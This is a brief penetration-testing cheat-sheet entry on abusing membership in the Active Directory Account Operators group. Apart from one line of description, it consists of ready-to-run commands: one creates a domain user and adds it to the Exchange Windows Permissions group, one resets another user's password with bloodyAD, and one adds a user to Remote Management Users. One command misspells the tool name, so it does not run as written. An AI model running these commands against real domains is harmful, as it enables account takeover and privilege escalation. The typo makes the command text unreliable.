**Account Operators** is a built-in group in Active Directory environments that allows members to manage user and group accounts. Members can create, modify, and delete accounts but have restricted administrative rights.

```bash
net user {NewUser} {password} /domain /add
net group "EXCHANGE WINDOWS PERMISSIONS" {NewUser} /add /domain
```

### Using BloodyAD:

Change users password:

```bash
bloodyAD -d domain.local --host x.x.x.x -u username -p username set password target_user new_password
```

Add user to a group:

```bash
bloodAD -d domain.local --host x.x.x.x -u username -p username add groupMember 'Remote Management Users' user_to_add
```